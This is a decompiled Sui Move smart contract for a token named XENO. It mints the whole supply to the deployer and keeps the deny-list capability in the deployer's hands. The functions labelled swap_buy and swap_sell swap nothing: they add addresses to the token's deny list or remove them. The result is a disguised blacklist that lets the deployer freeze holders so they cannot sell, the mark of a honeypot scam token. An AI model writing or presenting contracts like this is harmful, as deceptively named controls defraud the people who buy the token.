module 0x6fe09e840c9e537b60f8477f934139408111f409f4fba93113140424d810f1aa::xeno {
    struct XENO has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: XENO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<XENO>(arg0, 9, b"XENO", b"XENOMORPH", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmedHosYnfxJ2HLDY2r4FyiGxWFcVyXohRKVcfUzmQ4ogQ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<XENO>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<XENO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<XENO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<XENO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<XENO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<XENO>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<XENO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<XENO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

